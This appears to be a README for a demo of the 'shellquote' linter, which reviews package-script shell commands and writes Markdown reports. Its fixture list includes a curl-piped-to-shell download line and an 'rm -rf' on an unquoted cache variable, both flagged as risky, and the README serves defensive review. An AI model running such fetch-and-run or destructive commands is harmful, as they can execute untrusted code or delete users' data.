# Package Script Review Demo

This recipe uses `shellquote` to review package-script style shell commands
before copying them into a release checklist, agent approval prompt, or README.

## Run it

```sh
bash demo/package-script-review.sh
```

The script builds the CLI, writes Markdown reports under
`.shellquote-package-review/`, and verifies that risky fixture commands produce
findings.

## What the fixture covers

- `npm install` and `npm run build` are ordinary reviewable commands.
- `curl https://example.test/postinstall.sh | sh` is flagged as a
  download-piped-to-shell pattern.
- `rm -rf $npm_config_cache/*` is flagged for a destructive command and
  unquoted variable/glob handling.

The lint command exits `1` when error-level findings are present. The demo
treats that non-zero exit as expected evidence rather than a failed run.
